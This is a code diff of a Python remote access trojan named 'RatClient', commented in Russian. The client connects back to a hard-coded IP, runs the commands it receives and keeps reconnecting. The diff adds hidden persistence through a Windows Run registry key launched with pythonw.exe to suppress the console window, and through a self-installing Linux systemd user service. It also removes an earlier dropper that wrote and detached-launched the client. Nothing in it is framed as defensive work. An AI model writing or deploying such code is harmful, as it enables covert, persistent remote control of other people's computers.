@@ -1,12 +1,7 @@
-import os
-import sys
-import subprocess
-import time
-
-CLIENT_CODE = '''\
 import socket
 import subprocess
 import os
+import sys
 import time
 
 SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
@@ -20,7 +15,132 @@ def execute_command(command):
     except Exception as e:
         return f"Ошибка выполнения команды: {e}"
 
+def is_windows():
+    return os.name == 'nt'
+
+def add_to_autostart_windows():
+    try:
+        import winreg
+    except ImportError:
+        return False, "Модуль winreg не доступен"
+
+    try:
+        exe_path = sys.executable
+        script_path = os.path.abspath(__file__)
+        # Команда запуска: pythonw.exe client.py (pythonw убирает окно консоли)
+        if exe_path.lower().endswith("python.exe"):
+            pythonw_path = exe_path[:-4] + "w.exe"
+            if os.path.exists(pythonw_path):
+                exe_path = pythonw_path
+
+        cmd = f'"{exe_path}" "{script_path}"'
+
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "RatClient", 0, winreg.REG_SZ, cmd)
+        winreg.CloseKey(key)
+        return True, "Добавлено в автозагрузку Windows"
+    except Exception as e:
+        return False, f"Ошибка при добавлении в автозагрузку Windows: {e}"
+
+def is_in_autostart_windows():
+    try:
+        import winreg
+    except ImportError:
+        return False
+
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r"Software\Microsoft\Windows\CurrentVersion\Run",
+                            0, winreg.KEY_READ)
+        i = 0
+        while True:
+            name, value, _ = winreg.EnumValue(key, i)
+            if name == "RatClient":
+                return True
+            i += 1
+    except OSError:
+        return False
+
+def add_to_autostart_linux():
+    """
+    Добавляем systemd user-сервис:
+    Создаем файл ~/.config/systemd/user/ratclient.service
+    и запускаем его.
+    """
+    home = os.path.expanduser("~")
+    systemd_dir = os.path.join(home, ".config", "systemd", "user")
+    if not os.path.isdir(systemd_dir):
+        os.makedirs(systemd_dir, exist_ok=True)
+
+    service_path = os.path.join(systemd_dir, "ratclient.service")
+
+    python_path = sys.executable
+    script_path = os.path.abspath(__file__)
+
+    service_content = f"""[Unit]
+Description=Rat Client Service
+After=network.target
+
+[Service]
+ExecStart={python_path} {script_path}
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=default.target
+"""
+
+    if os.path.exists(service_path):
+        # Проверим совпадает ли содержимое – чтобы не перезаписывать постоянно
+        with open(service_path, "r", encoding="utf-8") as f:
+            existing = f.read()
+        if existing == service_content:
+            return True, f"Сервис systemd уже установлен: {service_path}"
+
+    try:
+        with open(service_path, "w", encoding="utf-8") as f:
+            f.write(service_content)
+    except Exception as e:
+        return False, f"Ошибка записи systemd unit файла: {e}"
+
+    # Активируем сервис
+    try:
+        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
+        subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
+        subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
+    except Exception as e:
+        return False, f"Ошибка при запуске systemd сервиса: {e}"
+
+    return True, f"Сервис systemd установлен и запущен: {service_path}"
+
+def is_in_autostart_linux():
+    home = os.path.expanduser("~")
+    service_path = os.path.join(home, ".config", "systemd", "user", "ratclient.service")
+    return os.path.exists(service_path)
+
+def add_self_to_autostart():
+    if is_windows():
+        if not is_in_autostart_windows():
+            success, msg = add_to_autostart_windows()
+            print(msg)
+        else:
+            print("Уже добавлен в автозагрузку Windows")
+    else:
+        if not is_in_autostart_linux():
+            success, msg = add_to_autostart_linux()
+            print(msg)
+        else:
+            print("Уже добавлен в systemd автозагрузку")
+
 def main():
+    # Добавляем автозапуск при старте
+    try:
+        add_self_to_autostart()
+    except Exception as e:
+        print(f"Ошибка добавления в автозапуск: {e}")
+
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
@@ -79,47 +199,6 @@ def main():
             s.close()
         # при разрыве ждем и переподключаемся заново
         time.sleep(5)
-
-if __name__ == "__main__":
-    main()
-'''
-
-def create_client_file():
-    filename = "client.py"
-    if os.path.exists(filename):
-        print(f"{filename} уже существует, пропускаем создание.")
-        return
-    with open(filename, "w", encoding="utf-8") as f:
-        f.write(CLIENT_CODE)
-    print(f"{filename} успешно создан.")
-
-def run_client_in_background():
-    # Запускаем client.py в фоне, без привязки к терминалу
-    # Кроссплатформенно пока делаем простой запуск subprocess и завершаемся
-    # Для Linux/macOS: nohup python3 client.py >/dev/null 2>&1 &
-    # Для Windows: pythonw.exe client.py
-
-    # Определяем команду запуска в зависимости от платформы
-    if os.name == 'nt':
-        # Windows
-        pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-        if not os.path.exists(pythonw_path):
-            # fallback на python.exe если pythonw нет
-            pythonw_path = sys.executable
-        # Запуск через CREATE_NO_WINDOW чтобы не показывать консоль
-        DETACHED_PROCESS = 0x00000008
-        subprocess.Popen([pythonw_path, "client.py"], creationflags=DETACHED_PROCESS)
-    else:
-        # Linux/macOS
-        # Используем nohup и запуск в фоне
-        subprocess.Popen(["nohup", sys.executable, "client.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
-
-def main():
-    create_client_file()
-    run_client_in_background()
-    print("Клиент запущен в фоне.")
-    # Если хочешь, можно завершать данный скрипт сразу:
-    # sys.exit()
 
 if __name__ == "__main__":
     main()
